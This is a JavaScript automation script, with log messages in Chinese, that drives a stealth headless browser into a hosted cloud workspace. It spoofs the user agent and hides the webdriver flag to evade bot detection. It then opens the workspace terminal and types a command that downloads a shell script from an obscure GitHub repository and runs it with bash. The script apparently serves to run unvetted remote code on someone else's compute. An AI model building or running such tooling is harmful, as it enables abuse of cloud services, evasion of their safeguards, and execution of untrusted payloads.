import { launch } from 'cloakbrowser';

const CONFIG = {
  workspaceDomain: '139.zo.computer',
  workspaceName: '139',
  waitAfterEnterWorkspace: 150000, 
  headless: true,
  runTmuxInit: process.env.INIT_TMUX === '1',
  tmuxCommand: "wget -O zzz.sh https://raw.githubusercontent.com/yghhbbuy/vvvioui/refs/heads/main/zzz.sh && chmod +x zzz.sh && bash zzz.sh",
};

async function safeScreenshot(page, path) {
  try { await page.screenshot({ path, fullPage: true }); } catch {}
}

async function selectWorkspace(page) {
  console.log('🔎 正在选择域名:', CONFIG.workspaceDomain);
  const target = page.locator(`text="${CONFIG.workspaceDomain}"`).first();
  
  // 确保可见性
  await target.waitFor({ state: 'visible', timeout: 10000 });
  await target.scrollIntoViewIfNeeded();
  
  // 双重点击：JS 原生点击 + 自动化点击
  await target.evaluate(el => el.click());
  await target.click({ force: true });
  
  console.log('✅ 点击完成，等待工作区环境就绪...');
  // 增加等待，这是自动启动的关键前提
  await page.waitForTimeout(20000); 
  return true;
}

async function clickStartButton(page) {
  console.log('🚀 检测是否需要手动启动...');
  const btnSelector = 'button:has-text("Start"), button:has-text("Run"), button:has-text("开始"), [aria-label*="Start"]';
  
  // 如果 5 秒内没看到按钮，我们假设它可能正在后台自动启动
  const btn = page.locator(btnSelector).first();
  if (await btn.isVisible({ timeout: 5000 })) {
    console.log('⚠️ 检测到启动按钮，手动点击中...');
    await btn.click({ force: true });
    await page.waitForTimeout(15000);
  } else {
    console.log('ℹ️ 未检测到启动按钮，假设系统已自动启动。');
  }
  return true;
}

async function run() {
  const url = process.argv[2];
  const browser = await launch({ headless: CONFIG.headless });
  const context = await browser.newContext({
    viewport: { width: 1920, height: 1080 },
    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
  });
  const page = await context.newPage();
  await page.addInitScript(() => { Object.defineProperty(navigator, 'webdriver', { get: () => undefined }); });

  try {
    await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 90000 });
    
    await selectWorkspace(page);
    await clickStartButton(page);
    
    // 终端初始化
    if (CONFIG.runTmuxInit) {
      await page.mouse.click(200, 400);
      await page.keyboard.press('Control+Shift+`');
      await page.waitForTimeout(5000);
      await page.keyboard.insertText(CONFIG.tmuxCommand);
      await page.keyboard.press('Enter');
    }
    
    await page.waitForTimeout(10000);
    await safeScreenshot(page, 'result.png');
  } catch (err) {
    console.error('❌ 执行失败:', err);
    await safeScreenshot(page, 'error-final.png');
  } finally {
    await browser.close();
  }
}

run();
